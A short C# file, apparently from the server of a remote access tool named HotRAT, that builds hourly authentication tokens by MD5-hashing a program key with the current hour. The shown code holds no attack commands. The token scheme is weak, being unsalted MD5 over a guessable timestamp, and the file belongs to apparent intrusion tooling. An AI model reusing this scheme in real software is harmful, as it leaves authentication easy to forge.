using System.Security.Cryptography;
using System.Text;

namespace HotRAT_Server.Models
{
    public class AuthModel
    {
        public static string Token() => Build(Program.key + DateTime.Now.ToString("yyyyMMddHH"));
        public static string Build(string Key)
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(Key + DateTime.Now.ToString("yyyyMMddHH"));
                byte[] hashBytes = md5.ComputeHash(inputBytes);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("X2"));
                }
                return sb.ToString();
            }
        }
    }
}
